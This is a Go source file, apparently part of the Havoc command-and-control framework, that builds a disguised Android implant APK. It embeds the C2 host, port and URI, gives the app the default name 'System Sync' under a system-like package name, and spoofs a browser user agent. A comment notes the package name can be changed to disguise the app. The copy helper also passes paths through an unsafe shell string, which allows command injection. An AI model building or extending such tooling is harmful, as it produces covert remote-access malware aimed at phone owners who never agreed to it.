package builder

/*
 * builder_android.go — APK builder for the DemonAndroid agent.
 *
 * Builds the DemonAndroid Gradle project with C2 parameters baked in as
 * Gradle properties (-P flags), then returns the signed APK bytes.
 *
 * Requirements on the teamserver host:
 *   - Android SDK (ANDROID_HOME set, or android-sdk installed)
 *   - Java 17+ (required by Gradle 8 / AGP 8.2)
 *   - The DemonAndroid/ project must exist under payloads/
 *
 * On macOS with Homebrew:
 *   brew install --cask android-commandlinetools
 *   sdkmanager "build-tools;34.0.0" "platforms;android-34"
 */

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"Havoc/pkg/logger"
	"Havoc/pkg/utils"
)

type AndroidBuilderConfig struct {
	AndroidSdkPath string // e.g. /opt/homebrew/share/android-commandlinetools
	JavaHome       string // e.g. /opt/homebrew/opt/openjdk@17
	DebugDev       bool
}

type AndroidBuilder struct {
	config      AndroidBuilderConfig
	sourcePath  string

	Host        string
	Port        int
	Uri         string
	Ssl         bool
	UserAgent   string  // must match the listener's configured User-Agent exactly
	PackageName string  // APK package name — change to disguise the app
	AppLabel    string  // Label shown in launcher

	OutputPath string
	CompileDir string

	SendConsoleMessage func(msgType, message string)
}

func NewAndroidBuilder(cfg AndroidBuilderConfig) *AndroidBuilder {
	ab := &AndroidBuilder{
		config:      cfg,
		sourcePath:  utils.GetTeamserverPath() + "/" + PayloadDir + "/DemonAndroid",
		PackageName: "com.android.systemsync",
		AppLabel:    "System Sync",
		UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	}

	// Auto-detect Android SDK
	if ab.config.AndroidSdkPath == "" {
		for _, candidate := range []string{
			os.Getenv("ANDROID_HOME"),
			os.Getenv("ANDROID_SDK_ROOT"),
			"/opt/homebrew/share/android-commandlinetools",
			"/usr/local/lib/android/sdk",
			os.Getenv("HOME") + "/Library/Android/sdk",
			os.Getenv("HOME") + "/Android/Sdk",
		} {
			if candidate != "" {
				if _, err := os.Stat(candidate); err == nil {
					ab.config.AndroidSdkPath = candidate
					break
				}
			}
		}
	}

	// Auto-detect Java 17
	if ab.config.JavaHome == "" {
		for _, candidate := range []string{
			os.Getenv("JAVA_HOME"),
			"/opt/homebrew/opt/openjdk@17",
			"/usr/local/opt/openjdk@17",
			"/usr/lib/jvm/java-17-openjdk-amd64",
			"/usr/lib/jvm/temurin-17",
		} {
			if candidate != "" {
				if _, err := os.Stat(candidate + "/bin/java"); err == nil {
					ab.config.JavaHome = candidate
					break
				}
			}
		}
	}

	return ab
}

func (ab *AndroidBuilder) Build() bool {
	// Validate source
	if _, err := os.Stat(ab.sourcePath); os.IsNotExist(err) {
		ab.msg("Error", fmt.Sprintf("DemonAndroid source not found: %s", ab.sourcePath))
		return false
	}

	if ab.config.AndroidSdkPath == "" {
		ab.msg("Error", "Android SDK not found. Set ANDROID_HOME or install via: brew install --cask android-commandlinetools")
		return false
	}

	if ab.config.JavaHome == "" {
		ab.msg("Error", "Java 17 not found. Install via: brew install openjdk@17")
		return false
	}

	// Temp build dir (copy project to avoid modifying the template)
	ab.CompileDir = "/tmp/havoc_android_" + utils.GenerateID(8) + "/"
	if err := copyDir(ab.sourcePath, ab.CompileDir); err != nil {
		ab.msg("Error", "Failed to copy project: "+err.Error())
		return false
	}

	// Determine gradlew path
	gradlew := filepath.Join(ab.CompileDir, "gradlew")
	if _, err := os.Stat(gradlew); os.IsNotExist(err) {
		// Download gradlew wrapper if not present
		if err := generateGradleWrapper(ab.CompileDir, ab.config.JavaHome); err != nil {
			ab.msg("Error", "Failed to create Gradle wrapper: "+err.Error())
			return false
		}
	}
	_ = os.Chmod(gradlew, 0755)

	// Build variant
	task := "assembleRelease"
	if ab.config.DebugDev {
		task = "assembleDebug"
	}

	// Gradle properties
	ua := ab.UserAgent
	if ua == "" {
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
	}
	label := ab.AppLabel
	if label == "" {
		label = "System Service"
	}
	props := []string{
		fmt.Sprintf("-PCONFIG_HOST=%s", ab.Host),
		fmt.Sprintf("-PCONFIG_PORT=%d", ab.Port),
		fmt.Sprintf("-PCONFIG_URI=%s", ab.Uri),
		fmt.Sprintf("-PCONFIG_SSL=%v", ab.Ssl),
		fmt.Sprintf("-PCONFIG_PKG=%s", ab.PackageName),
		fmt.Sprintf("-PCONFIG_LABEL=%s", label),
		fmt.Sprintf("-PCONFIG_UA=%s", ua),
	}

	args := append([]string{task, "--no-daemon"}, props...)
	ab.msg("Info", fmt.Sprintf("Running: ./gradlew %s", strings.Join(args, " ")))

	cmd := exec.Command(gradlew, args...)
	cmd.Dir = ab.CompileDir
	cmd.Env = append(os.Environ(),
		"ANDROID_HOME="+ab.config.AndroidSdkPath,
		"ANDROID_SDK_ROOT="+ab.config.AndroidSdkPath,
		"JAVA_HOME="+ab.config.JavaHome,
	)

	output, err := cmd.CombinedOutput()
	if len(output) > 0 {
		ab.msg("Info", "Gradle output:\n"+string(output))
	}
	if err != nil {
		ab.msg("Error", "APK build failed: "+err.Error())
		return false
	}

	// Find the APK
	variant := "release"
	if ab.config.DebugDev { variant = "debug" }
	apkPath := filepath.Join(ab.CompileDir, "app", "build", "outputs", "apk",
		variant, fmt.Sprintf("app-%s.apk", variant))

	if _, err := os.Stat(apkPath); os.IsNotExist(err) {
		// Try unsigned
		apkPath = filepath.Join(ab.CompileDir, "app", "build", "outputs", "apk",
			variant, fmt.Sprintf("app-%s-unsigned.apk", variant))
	}

	if ab.OutputPath == "" {
		ab.OutputPath = apkPath
	} else if apkPath != ab.OutputPath {
		_ = os.Rename(apkPath, ab.OutputPath)
	}

	ab.msg("Good", fmt.Sprintf("APK built: %s", ab.OutputPath))
	return true
}

func (ab *AndroidBuilder) msg(t, m string) {
	if ab.SendConsoleMessage != nil {
		ab.SendConsoleMessage(t, "[AndroidBuilder] "+m)
	}
	logger.Debug("[AndroidBuilder] " + t + ": " + m)
}

// ── Helpers ───────────────────────────────────────────────────────────

func copyDir(src, dst string) error {
	var script string
	if runtime.GOOS == "windows" {
		script = fmt.Sprintf("xcopy /E /I /Q \"%s\" \"%s\"", src, dst)
	} else {
		script = fmt.Sprintf("cp -r '%s' '%s'", src, dst)
	}
	cmd := exec.Command("sh", "-c", script)
	return cmd.Run()
}

// generateGradleWrapper runs `gradle wrapper` to create gradlew if missing
func generateGradleWrapper(dir, javaHome string) error {
	gradle, err := exec.LookPath("gradle")
	if err != nil {
		return fmt.Errorf("gradle not found: install with 'brew install gradle'")
	}
	cmd := exec.Command(gradle, "wrapper", "--gradle-version", "8.2")
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "JAVA_HOME="+javaHome)
	return cmd.Run()
}
